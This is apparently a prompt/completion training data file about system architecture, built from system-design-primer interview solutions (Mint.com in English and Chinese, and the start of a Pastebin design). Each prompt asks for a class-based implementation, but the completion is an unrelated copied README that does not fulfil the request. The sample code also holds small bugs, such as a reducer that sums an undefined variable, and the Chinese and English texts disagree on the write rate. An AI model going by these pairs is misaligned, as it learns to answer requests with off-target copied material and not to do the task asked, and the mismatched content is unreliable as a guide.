按类别生成每月总支出\n\n对交易文件的运行分析可以显著减少数据库的负载。\n\n如果用户更新类别，我们可以调用 **预算服务** 重新运行分析。\n\n**告知你的面试官你准备写多少代码**.\n\n日志文件格式样例，以tab分割：\n\n```\nuser_id   timestamp   seller  amount\n```\n\n**MapReduce** 实现:\n\n```python\nclass SpendingByCategory(MRJob):\n\n    def __init__(self, categorizer):\n        self.categorizer = categorizer\n        self.current_year_month = calc_current_year_month()\n        ...\n\n    def calc_current_year_month(self):\n        \"\"\"返回当前年月\"\"\"\n        ...\n\n    def extract_year_month(self, timestamp):\n        \"\"\"返回时间戳的年，月部分\"\"\"\n        ...\n\n    def handle_budget_notifications(self, key, total):\n        \"\"\"如果接近或超出预算，调用通知API\"\"\"\n        ...\n\n    def mapper(self, _, line):\n        \"\"\"解析每个日志行，提取和转换相关行。\n\n        参数行应为如下形式：\n\n        user_id   timestamp   seller  amount\n\n        使用分类器来将卖家转换成类别，生成如下形式的key-value对：\n\n        (user_id, 2016-01, shopping), 25\n        (user_id, 2016-01, shopping), 100\n        (user_id, 2016-01, gas), 50\n        \"\"\"\n        user_id, timestamp, seller, amount = line.split('\\t')\n        category = self.categorizer.categorize(seller)\n        period = self.extract_year_month(timestamp)\n        if period == self.current_year_month:\n            yield (user_id, period, category), amount\n\n    def reducer(self, key, value):\n        \"\"\"将每个key对应的值求和。\n\n        (user_id, 2016-01, shopping), 125\n        (user_id, 2016-01, gas), 50\n        \"\"\"\n        total = sum(values)\n        yield key, sum(values)\n```\n\n## 第四步：设计扩展\n\n> 根据限制条件，找到并解决瓶颈。\n\n![Imgur](http://i.imgur.com/V5q57vU.png)\n\n**重要提示：不要从最初设计直接跳到最终设计中！**\n\n现在你要 1) **基准测试、负载测试**。2) **分析、描述**性能瓶颈。3) 在解决瓶颈问题的同时，评估替代方案、权衡利弊。4) 重复以上步骤。请阅读[「设计一个系统，并将其扩大到为数以百万计的 AWS 用户服务」](../scaling_aws/README.md) 来了解如何逐步扩大初始设计。\n\n讨论初始设计可能遇到的瓶颈及相关解决方案是很重要的。例如加上一个配置多台 **Web 服务器**的**负载均衡器**是否能够解决问题？**CDN**呢？**主从复制**呢？它们各自的替代方案和需要**权衡**的利弊又有什么呢？\n\n我们将会介绍一些组件来完成设计，并解决架构扩张问题。内置的负载均衡器将不做讨论以节省篇幅。\n\n**为了避免重复讨论**，请参考[系统设计主题索引](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#系统设计主题的索引)相关部分来了解其要点、方案的权衡取舍以及可选的替代方案。\n\n* [DNS](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#域名系统)\n* [负载均衡器](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#负载均衡器)\n* [水平拓展](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#水平扩展)\n* [反向代理（web 服务器）](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#反向代理web-服务器)\n* [API 服务（应用层）](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#应用层)\n* [缓存](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#缓存)\n* [关系型数据库管理系统 (RDBMS)](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#关系型数据库管理系统rdbms)\n* [SQL 故障主从切换](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#故障切换)\n* [主从复制](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#主从复制)\n* [异步](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#异步)\n* [一致性模式](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#一致性模式)\n* [可用性模式](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#可用性模式)\n\n我们将增加一个额外的用例：**用户** 访问摘要和交易数据。\n\n用户会话，按类别统计的统计信息，以及最近的事务可以放在 **内存缓存**（如 Redis 或 Memcached ）中。\n\n* **客户端** 发送读请求给 **Web 服务器**\n* **Web 服务器** 转发请求到 **读 API** 服务器\n    * 静态内容可通过 **对象存储** 比如缓存在 **CDN** 上的 S3 来服务\n* **读 API** 服务器做如下动作:\n    * 检查 **内存缓存** 的内容\n        * 如果URL在 **内存缓存**中，返回缓存的内容\n        * 否则\n            * 如果URL在 **SQL 数据库**中，获取该内容\n                * 以其内容更新 **内存缓存**\n\n参考 [何时更新缓存](https://github.com/donnemartin/system-design-primer#when-to-update-the-cache) 中权衡和替代的内容。以上方法描述了 [cache-aside缓存模式](https://github.com/donnemartin/system-design-primer#cache-aside).\n\n我们可以使用诸如 Amazon Redshift 或者 Google BigQuery 等数据仓库解决方案，而不是将`monthly_spending`聚合表保留在 **SQL 数据库** 中。\n\n我们可能只想在数据库中存储一个月的`交易`数据，而将其余数据存储在数据仓库或者 **对象存储区** 中。**对象存储区** （如Amazon S3) 能够舒服地解决每月 250 GB新内容的限制。\n\n为了解决每秒 *平均* 2000 次读请求数（峰值时更高），受欢迎的内容的流量应由 **内存缓存** 而不是数据库来处理。 **内存缓存** 也可用于处理不均匀分布的流量和流量尖峰。 只要副本不陷入重复写入的困境，**SQL 读副本** 应该能够处理高速缓存未命中。\n\n*平均* 200 次交易写入每秒（峰值时更高）对于单个 **SQL 写入主-从服务** 来说可能是棘手的。我们可能需要考虑其它的 SQL 性能拓展技术：\n\n* [联合](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#联合)\n* [分片](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#分片)\n* [非规范化](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#非规范化)\n* [SQL 调优](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#sql-调优)\n\n我们也可以考虑将一些数据移至 **NoSQL 数据库**。\n\n## 其它要点\n\n> 是否深入这些额外的主题，取决于你的问题范围和剩下的时间。\n\n#### NoSQL\n\n* [键-值存储](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#键-值存储)\n* [文档类型存储](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#文档类型存储)\n* [列型存储](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#列型存储)\n* [图数据库](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#图数据库)\n* [SQL vs NoSQL](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#sql-还是-nosql)\n\n### 缓存\n\n* 在哪缓存\n    * [客户端缓存](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#客户端缓存)\n    * [CDN 缓存](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#cdn-缓存)\n    * [Web 服务器缓存](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#web-服务器缓存)\n    * [数据库缓存](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#数据库缓存)\n    * [应用缓存](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#应用缓存)\n* 什么需要缓存\n    * [数据库查询级别的缓存](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#数据库查询级别的缓存)\n    * [对象级别的缓存](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#对象级别的缓存)\n* 何时更新缓存\n    * [缓存模式](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#缓存模式)\n    * [直写模式](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#直写模式)\n    * [回写模式](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#回写模式)\n    * [刷新](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#刷新)\n\n### 异步与微服务\n\n* [消息队列](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#消息队列)\n* [任务队列](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#任务队列)\n* [背压](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#背压)\n* [微服务](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#微服务)\n\n### 通信\n\n* 可权衡选择的方案：\n    * 与客户端的外部通信 - [使用 REST 作为 HTTP API](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#表述性状态转移rest)\n    * 服务器内部通信 - [RPC](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#远程过程调用协议rpc)\n* [服务发现](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#服务发现)\n\n### 安全性\n\n请参阅[「安全」](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#安全)一章。\n\n### 延迟数值\n\n请参阅[「每个程序员都应该知道的延迟数」](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#每个程序员都应该知道的延迟数)。\n\n### 持续探讨\n\n* 持续进行基准测试并监控你的系统，以解决他们提出的瓶颈问题。\n* 架构拓展是一个迭代的过程。\n", "metadata": {"source": "github.com/donnemartin/system-design-primer", "file_path": "solutions/system_design/mint/README-zh-Hans.md", "language": "markdown", "complexity": "complex", "star_count": 312958, "quality_score": 0.89, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": true, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": true, "line_count": 441}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design scalable system architecture with load balancing and caching using microservices design patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Design Mint.com\n\n*Note: This document links directly to relevant areas found in the [system design topics](https://github.com/donnemartin/system-design-primer#index-of-system-design-topics) to avoid duplication.  Refer to the linked content for general talking points, tradeoffs, and alternatives.*\n\n## Step 1: Outline use cases and constraints\n\n> Gather requirements and scope the problem.\n> Ask questions to clarify use cases and constraints.\n> Discuss assumptions.\n\nWithout an interviewer to address clarifying questions, we'll define some use cases and constraints.\n\n### Use cases\n\n#### We'll scope the problem to handle only the following use cases\n\n* **User** connects to a financial account\n* **Service** extracts transactions from the account\n    * Updates daily\n    * Categorizes transactions\n        * Allows manual category override by the user\n        * No automatic re-categorization\n    * Analyzes monthly spending, by category\n* **Service** recommends a budget\n    * Allows users to manually set a budget\n    * Sends notifications when approaching or exceeding budget\n* **Service** has high availability\n\n#### Out of scope\n\n* **Service** performs additional logging and analytics\n\n### Constraints and assumptions\n\n#### State assumptions\n\n* Traffic is not evenly distributed\n* Automatic daily update of accounts applies only to users active in the past 30 days\n* Adding or removing financial accounts is relatively rare\n* Budget notifications don't need to be instant\n* 10 million users\n    * 10 budget categories per user = 100 million budget items\n    * Example categories:\n        * Housing = $1,000\n        * Food = $200\n        * Gas = $100\n    * Sellers are used to determine transaction category\n        * 50,000 sellers\n* 30 million financial accounts\n* 5 billion transactions per month\n* 500 million read requests per month\n* 10:1 write to read ratio\n    * Write-heavy, users make transactions daily, but few visit the site daily\n\n#### Calculate usage\n\n**Clarify with your interviewer if you should run back-of-the-envelope usage calculations.**\n\n* Size per transaction:\n    * `user_id` - 8 bytes\n    * `created_at` - 5 bytes\n    * `seller` - 32 bytes\n    * `amount` - 5 bytes\n    * Total: ~50 bytes\n* 250 GB of new transaction content per month\n    * 50 bytes per transaction * 5 billion transactions per month\n    * 9 TB of new transaction content in 3 years\n    * Assume most are new transactions instead of updates to existing ones\n* 2,000 transactions per second on average\n* 200 read requests per second on average\n\nHandy conversion guide:\n\n* 2.5 million seconds per month\n* 1 request per second = 2.5 million requests per month\n* 40 requests per second = 100 million requests per month\n* 400 requests per second = 1 billion requests per month\n\n## Step 2: Create a high level design\n\n> Outline a high level design with all important components.\n\n![Imgur](http://i.imgur.com/E8klrBh.png)\n\n## Step 3: Design core components\n\n> Dive into details for each core component.\n\n### Use case: User connects to a financial account\n\nWe could store info on the 10 million users in a [relational database](https://github.com/donnemartin/system-design-primer#relational-database-management-system-rdbms).  We should discuss the [use cases and tradeoffs between choosing SQL or NoSQL](https://github.com/donnemartin/system-design-primer#sql-or-nosql).\n\n* The **Client** sends a request to the **Web Server**, running as a [reverse proxy](https://github.com/donnemartin/system-design-primer#reverse-proxy-web-server)\n* The **Web Server** forwards the request to the **Accounts API** server\n* The **Accounts API** server updates the **SQL Database** `accounts` table with the newly entered account info\n\n**Clarify with your interviewer how much code you are expected to write**.\n\nThe `accounts` table could have the following structure:\n\n```\nid int NOT NULL AUTO_INCREMENT\ncreated_at datetime NOT NULL\nlast_update datetime NOT NULL\naccount_url varchar(255) NOT NULL\naccount_login varchar(32) NOT NULL\naccount_password_hash char(64) NOT NULL\nuser_id int NOT NULL\nPRIMARY KEY(id)\nFOREIGN KEY(user_id) REFERENCES users(id)\n```\n\nWe'll create an [index](https://github.com/donnemartin/system-design-primer#use-good-indices) on `id`, `user_id `, and `created_at` to speed up lookups (log-time instead of scanning the entire table) and to keep the data in memory.  Reading 1 MB sequentially from memory takes about 250 microseconds, while reading from SSD takes 4x and from disk takes 80x longer.<sup><a href=https://github.com/donnemartin/system-design-primer#latency-numbers-every-programmer-should-know>1</a></sup>\n\nWe'll use a public [**REST API**](https://github.com/donnemartin/system-design-primer#representational-state-transfer-rest):\n\n```\n$ curl -X POST --data '{ \"user_id\": \"foo\", \"account_url\": \"bar\", \\\n    \"account_login\": \"baz\", \"account_password\": \"qux\" }' \\\n    https://mint.com/api/v1/account\n```\n\nFor internal communications, we could use [Remote Procedure Calls](https://github.com/donnemartin/system-design-primer#remote-procedure-call-rpc).\n\nNext, the service extracts transactions from the account.\n\n### Use case: Service extracts transactions from the account\n\nWe'll want to extract information from an account in these cases:\n\n* The user first links the account\n* The user manually refreshes the account\n* Automatically each day for users who have been active in the past 30 days\n\nData flow:\n\n* The **Client** sends a request to the **Web Server**\n* The **Web Server** forwards the request to the **Accounts API** server\n* The **Accounts API** server places a job on a **Queue** such as [Amazon SQS](https://aws.amazon.com/sqs/) or [RabbitMQ](https://www.rabbitmq.com/)\n    * Extracting transactions could take awhile, we'd probably want to do this [asynchronously with a queue](https://github.com/donnemartin/system-design-primer#asynchronism), although this introduces additional complexity\n* The **Transaction Extraction Service** does the following:\n    * Pulls from the **Queue** and extracts transactions for the given account from the financial institution, storing the results as raw log files in the **Object Store**\n    * Uses the **Category Service** to categorize each transaction\n    * Uses the **Budget Service** to calculate aggregate monthly spending by category\n        * The **Budget Service** uses the **Notification Service** to let users know if they are nearing or have exceeded their budget\n    * Updates the **SQL Database** `transactions` table with categorized transactions\n    * Updates the **SQL Database** `monthly_spending` table with aggregate monthly spending by category\n    * Notifies the user the transactions have completed through the **Notification Service**:\n        * Uses a **Queue** (not pictured) to asynchronously send out notifications\n\nThe `transactions` table could have the following structure:\n\n```\nid int NOT NULL AUTO_INCREMENT\ncreated_at datetime NOT NULL\nseller varchar(32) NOT NULL\namount decimal NOT NULL\nuser_id int NOT NULL\nPRIMARY KEY(id)\nFOREIGN KEY(user_id) REFERENCES users(id)\n```\n\nWe'll create an [index](https://github.com/donnemartin/system-design-primer#use-good-indices) on `id`, `user_id `, and `created_at`.\n\nThe `monthly_spending` table could have the following structure:\n\n```\nid int NOT NULL AUTO_INCREMENT\nmonth_year date NOT NULL\ncategory varchar(32)\namount decimal NOT NULL\nuser_id int NOT NULL\nPRIMARY KEY(id)\nFOREIGN KEY(user_id) REFERENCES users(id)\n```\n\nWe'll create an [index](https://github.com/donnemartin/system-design-primer#use-good-indices) on `id` and `user_id `.\n\n#### Category service\n\nFor the **Category Service**, we can seed a seller-to-category dictionary with the most popular sellers.  If we estimate 50,000 sellers and estimate each entry to take less than 255 bytes, the dictionary would only take about 12 MB of memory.\n\n**Clarify with your interviewer how much code you are expected to write**.\n\n```python\nclass DefaultCategories(Enum):\n\n    HOUSING = 0\n    FOOD = 1\n    GAS = 2\n    SHOPPING = 3\n    ...\n\nseller_category_map = {}\nseller_category_map['Exxon'] = DefaultCategories.GAS\nseller_category_map['Target'] = DefaultCategories.SHOPPING\n...\n```\n\nFor sellers not initially seeded in the map, we could use a crowdsourcing effort by evaluating the manual category overrides our users provide.  We could use a heap to quickly lookup the top manual override per seller in O(1) time.\n\n```python\nclass Categorizer(object):\n\n    def __init__(self, seller_category_map, seller_category_crowd_overrides_map):\n        self.seller_category_map = seller_category_map\n        self.seller_category_crowd_overrides_map = \\\n            seller_category_crowd_overrides_map\n\n    def categorize(self, transaction):\n        if transaction.seller in self.seller_category_map:\n            return self.seller_category_map[transaction.seller]\n        elif transaction.seller in self.seller_category_crowd_overrides_map:\n            self.seller_category_map[transaction.seller] = \\\n                self.seller_category_crowd_overrides_map[transaction.seller].peek_min()\n            return self.seller_category_map[transaction.seller]\n        return None\n```\n\nTransaction implementation:\n\n```python\nclass Transaction(object):\n\n    def __init__(self, created_at, seller, amount):\n        self.created_at = created_at\n        self.seller = seller\n        self.amount = amount\n```\n\n### Use case: Service recommends a budget\n\nTo start, we could use a generic budget template that allocates category amounts based on income tiers.  Using this approach, we would not have to store the 100 million budget items identified in the constraints, only those that the user overrides.  If a user overrides a budget category, which we could store the override in the `TABLE budget_overrides`.\n\n```python\nclass Budget(object):\n\n    def __init__(self, income):\n        self.income = income\n        self.categories_to_budget_map = self.create_budget_template()\n\n    def create_budget_template(self):\n        return {\n            DefaultCategories.HOUSING: self.income * .4,\n            DefaultCategories.FOOD: self.income * .2,\n            DefaultCategories.GAS: self.income * .1,\n            DefaultCategories.SHOPPING: self.income * .2,\n            ...\n        }\n\n    def override_category_budget(self, category, amount):\n        self.categories_to_budget_map[category] = amount\n```\n\nFor the **Budget Service**, we can potentially run SQL queries on the `transactions` table to generate the `monthly_spending` aggregate table.  The `monthly_spending` table would likely have much fewer rows than the total 5 billion transactions, since users typically have many transactions per month.\n\nAs an alternative, we can run **MapReduce** jobs on the raw transaction files to:\n\n* Categorize each transaction\n* Generate aggregate monthly spending by category\n\nRunning analyses on the transaction files could significantly reduce the load on the database.\n\nWe could call the **Budget Service** to re-run the analysis if the user updates a category.\n\n**Clarify with your interviewer how much code you are expected to write**.\n\nSample log file format, tab delimited:\n\n```\nuser_id   timestamp   seller  amount\n```\n\n**MapReduce** implementation:\n\n```python\nclass SpendingByCategory(MRJob):\n\n    def __init__(self, categorizer):\n        self.categorizer = categorizer\n        self.current_year_month = calc_current_year_month()\n        ...\n\n    def calc_current_year_month(self):\n        \"\"\"Return the current year and month.\"\"\"\n        ...\n\n    def extract_year_month(self, timestamp):\n        \"\"\"Return the year and month portions of the timestamp.\"\"\"\n        ...\n\n    def handle_budget_notifications(self, key, total):\n        \"\"\"Call notification API if nearing or exceeded budget.\"\"\"\n        ...\n\n    def mapper(self, _, line):\n        \"\"\"Parse each log line, extract and transform relevant lines.\n\n        Argument line will be of the form:\n\n        user_id   timestamp   seller  amount\n\n        Using the categorizer to convert seller to category,\n        emit key value pairs of the form:\n\n        (user_id, 2016-01, shopping), 25\n        (user_id, 2016-01, shopping), 100\n        (user_id, 2016-01, gas), 50\n        \"\"\"\n        user_id, timestamp, seller, amount = line.split('\\t')\n        category = self.categorizer.categorize(seller)\n        period = self.extract_year_month(timestamp)\n        if period == self.current_year_month:\n            yield (user_id, period, category), amount\n\n    def reducer(self, key, value):\n        \"\"\"Sum values for each key.\n\n        (user_id, 2016-01, shopping), 125\n        (user_id, 2016-01, gas), 50\n        \"\"\"\n        total = sum(values)\n        yield key, sum(values)\n```\n\n## Step 4: Scale the design\n\n> Identify and address bottlenecks, given the constraints.\n\n![Imgur](http://i.imgur.com/V5q57vU.png)\n\n**Important: Do not simply jump right into the final design from the initial design!**\n\nState you would 1) **Benchmark/Load Test**, 2) **Profile** for bottlenecks 3) address bottlenecks while evaluating alternatives and trade-offs, and 4) repeat.  See [Design a system that scales to millions of users on AWS](../scaling_aws/README.md) as a sample on how to iteratively scale the initial design.\n\nIt's important to discuss what bottlenecks you might encounter with the initial design and how you might address each of them.  For example, what issues are addressed by adding a **Load Balancer** with multiple **Web Servers**?  **CDN**?  **Master-Slave Replicas**?  What are the alternatives and **Trade-Offs** for each?\n\nWe'll introduce some components to complete the design and to address scalability issues.  Internal load balancers are not shown to reduce clutter.\n\n*To avoid repeating discussions*, refer to the following [system design topics](https://github.com/donnemartin/system-design-primer#index-of-system-design-topics) for main talking points, tradeoffs, and alternatives:\n\n* [DNS](https://github.com/donnemartin/system-design-primer#domain-name-system)\n* [CDN](https://github.com/donnemartin/system-design-primer#content-delivery-network)\n* [Load balancer](https://github.com/donnemartin/system-design-primer#load-balancer)\n* [Horizontal scaling](https://github.com/donnemartin/system-design-primer#horizontal-scaling)\n* [Web server (reverse proxy)](https://github.com/donnemartin/system-design-primer#reverse-proxy-web-server)\n* [API server (application layer)](https://github.com/donnemartin/system-design-primer#application-layer)\n* [Cache](https://github.com/donnemartin/system-design-primer#cache)\n* [Relational database management system (RDBMS)](https://github.com/donnemartin/system-design-primer#relational-database-management-system-rdbms)\n* [SQL write master-slave failover](https://github.com/donnemartin/system-design-primer#fail-over)\n* [Master-slave replication](https://github.com/donnemartin/system-design-primer#master-slave-replication)\n* [Asynchronism](https://github.com/donnemartin/system-design-primer#asynchronism)\n* [Consistency patterns](https://github.com/donnemartin/system-design-primer#consistency-patterns)\n* [Availability patterns](https://github.com/donnemartin/system-design-primer#availability-patterns)\n\nWe'll add an additional use case: **User** accesses summaries and transactions.\n\nUser sessions, aggregate stats by category, and recent transactions could be placed in a **Memory Cache** such as Redis or Memcached.\n\n* The **Client** sends a read request to the **Web Server**\n* The **Web Server** forwards the request to the **Read API** server\n    * Static content can be served from the **Object Store** such as S3, which is cached on the **CDN**\n* The **Read API** server does the following:\n    * Checks the **Memory Cache** for the content\n        * If the url is in the **Memory Cache**, returns the cached contents\n        * Else\n            * If the url is in the **SQL Database**, fetches the contents\n                * Updates the **Memory Cache** with the contents\n\nRefer to [When to update the cache](https://github.com/donnemartin/system-design-primer#when-to-update-the-cache) for tradeoffs and alternatives.  The approach above describes [cache-aside](https://github.com/donnemartin/system-design-primer#cache-aside).\n\nInstead of keeping the `monthly_spending` aggregate table in the **SQL Database**, we could create a separate **Analytics Database** using a data warehousing solution such as Amazon Redshift or Google BigQuery.\n\nWe might only want to store a month of `transactions` data in the database, while storing the rest in a data warehouse or in an **Object Store**.  An **Object Store** such as Amazon S3 can comfortably handle the constraint of 250 GB of new content per month.\n\nTo address the 200 *average* read requests per second (higher at peak), traffic for popular content should be handled by the **Memory Cache** instead of the database.  The **Memory Cache** is also useful for handling the unevenly distributed traffic and traffic spikes.  The **SQL Read Replicas** should be able to handle the cache misses, as long as the replicas are not bogged down with replicating writes.\n\n2,000 *average* transaction writes per second (higher at peak) might be tough for a single **SQL Write Master-Slave**.  We might need to employ additional SQL scaling patterns:\n\n* [Federation](https://github.com/donnemartin/system-design-primer#federation)\n* [Sharding](https://github.com/donnemartin/system-design-primer#sharding)\n* [Denormalization](https://github.com/donnemartin/system-design-primer#denormalization)\n* [SQL Tuning](https://github.com/donnemartin/system-design-primer#sql-tuning)\n\nWe should also consider moving some data to a **NoSQL Database**.\n\n## Additional talking points\n\n> Additional topics to dive into, depending on the problem scope and time remaining.\n\n#### NoSQL\n\n* [Key-value store](https://github.com/donnemartin/system-design-primer#key-value-store)\n* [Document store](https://github.com/donnemartin/system-design-primer#document-store)\n* [Wide column store](https://github.com/donnemartin/system-design-primer#wide-column-store)\n* [Graph database](https://github.com/donnemartin/system-design-primer#graph-database)\n* [SQL vs NoSQL](https://github.com/donnemartin/system-design-primer#sql-or-nosql)\n\n### Caching\n\n* Where to cache\n    * [Client caching](https://github.com/donnemartin/system-design-primer#client-caching)\n    * [CDN caching](https://github.com/donnemartin/system-design-primer#cdn-caching)\n    * [Web server caching](https://github.com/donnemartin/system-design-primer#web-server-caching)\n    * [Database caching](https://github.com/donnemartin/system-design-primer#database-caching)\n    * [Application caching](https://github.com/donnemartin/system-design-primer#application-caching)\n* What to cache\n    * [Caching at the database query level](https://github.com/donnemartin/system-design-primer#caching-at-the-database-query-level)\n    * [Caching at the object level](https://github.com/donnemartin/system-design-primer#caching-at-the-object-level)\n* When to update the cache\n    * [Cache-aside](https://github.com/donnemartin/system-design-primer#cache-aside)\n    * [Write-through](https://github.com/donnemartin/system-design-primer#write-through)\n    * [Write-behind (write-back)](https://github.com/donnemartin/system-design-primer#write-behind-write-back)\n    * [Refresh ahead](https://github.com/donnemartin/system-design-primer#refresh-ahead)\n\n### Asynchronism and microservices\n\n* [Message queues](https://github.com/donnemartin/system-design-primer#message-queues)\n* [Task queues](https://github.com/donnemartin/system-design-primer#task-queues)\n* [Back pressure](https://github.com/donnemartin/system-design-primer#back-pressure)\n* [Microservices](https://github.com/donnemartin/system-design-primer#microservices)\n\n### Communications\n\n* Discuss tradeoffs:\n    * External communication with clients - [HTTP APIs following REST](https://github.com/donnemartin/system-design-primer#representational-state-transfer-rest)\n    * Internal communications - [RPC](https://github.com/donnemartin/system-design-primer#remote-procedure-call-rpc)\n* [Service discovery](https://github.com/donnemartin/system-design-primer#service-discovery)\n\n### Security\n\nRefer to the [security section](https://github.com/donnemartin/system-design-primer#security).\n\n### Latency numbers\n\nSee [Latency numbers every programmer should know](https://github.com/donnemartin/system-design-primer#latency-numbers-every-programmer-should-know).\n\n### Ongoing\n\n* Continue benchmarking and monitoring your system to address bottlenecks as they come up\n* Scaling is an iterative process\n", "metadata": {"source": "github.com/donnemartin/system-design-primer", "file_path": "solutions/system_design/mint/README.md", "language": "markdown", "complexity": "complex", "star_count": 312958, "quality_score": 0.9500000000000001, "features": {"has_microservices": true, "has_api_design": true, "has_load_balancing": true, "has_caching": true, "has_database_design": true, "has_security": true, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": true, "line_count": 442}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design scalable system architecture with load balancing and caching for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# 设计 Pastebin.com (或者 Bit.ly)\n\n**注意: 为了避免重复，当前文档会直接链接到[系统设计主题](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#系统设计主题的索引)的相关区域，请参考链接内容以获得综合的讨论点、权衡和替代方案。**\n\n**设计 Bit.ly** - 是一个类似的问题，区别是 pastebin 需要存储的是 paste 的内容，而不是原始的未短化的 url。\n\n## 第一步：概述用例和约束\n\n> 收集这个问题的需求和范畴。\n> 问相关问题来明确用例和约束。\n> 讨论一些假设。\n\n因为没有面试官来明确这些问题，所以我们自己将定义一些用例和约束。\n\n### 用例\n\n#### 我们将问题的范畴限定在如下用例\n\n* **用户** 输入一段文本，然后得到一个随机生成的链接\n  * 过期设置\n    * 默认的设置是不会过期的\n    * 可以选择设置一个过期的时间\n* **用户** 输入一个 paste 的 url 后，可以看到它存储的内容\n* **用户** 是匿名的\n* **Service** 跟踪页面分析\n  * 一个月的访问统计\n* **Service** 删除过期的 pastes\n* **Service** 需要高可用\n\n#### 超出范畴的用例\n\n* **用户** 可以注册一个账户\n  * **用户** 通过验证邮箱\n* **用户** 可以用注册的账户登录\n  * **用户** 可以编辑文档\n* **用户** 可以设置可见性\n* **用户** 可以设置短链接\n\n### 约束和假设\n\n#### 状态假设\n\n* 访问流量不是均匀分布的\n* 打开一个短链接应该是很快的\n* pastes 只能是文本\n* 页面访问分析数据可以不用实时\n* 一千万的用户量\n* 每个月一千万的 paste 写入量\n* 每个月一亿的 paste 读取量\n* 读写比例在 10:1\n\n#### 计算使用\n\n**向面试官说明你是否应该粗略计算一下使用情况。**\n\n* 每个 paste 的大小\n  * 每一个 paste 1 KB\n  * `shortlink` - 7 bytes\n  * `expiration_length_in_minutes` - 4 bytes\n  * `created_at` - 5 bytes\n  * `paste_path` - 255 bytes\n  * 总共 = ~1.27 KB\n* 每个月新的 paste 内容在 12.7GB\n  * (1.27 * 10000000)KB / 月的 paste\n  * 三年内将近 450GB 的新 paste 内容\n  * 三年内 3.6 亿短链接\n  * 假设大部分都是新的 paste，而不是需要更新已存在的 paste\n* 平均 4paste/s 的写入速度\n* 平均 40paste/s 的读取速度\n\n简单的转换指南:\n\n* 2.5 百万 req/s\n* 1 req/s = 2.5 百万 req/m\n* 40 req/s = 1 亿 req/m\n* 400 req/s = 10 亿 req/m\n\n## 第二步：创建一个高层次设计\n\n> 概述一个包括所有重要的组件的高层次设计\n\n![Imgur](http://i.imgur.com/BKsBnmG.png)\n\n## 第三步：设计核心组件\n\n> 深入每一个核心组件的细节\n\n### 用例：用户输入一段文本，然后得到一个随机生成的链接\n\n我们可以用一个 [关系型数据库](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#关系型数据库管理系统rdbms)作为一个大的哈希表，用来把生成的 url 映射到一个包含 paste 文件的文件服务器和路径上。\n\n为了避免托管一个文件服务器，我们可以用一个托管的**对象存储**，比如 Amazon 的 S3 或者[NoSQL 文档类型存储](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#文档类型存储)。\n\n作为一个大的哈希表的关系型数据库的替代方案，我们可以用[NoSQL 键值存储](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#键-值存储)。我们需要讨论[选择 SQL 或 NoSQL 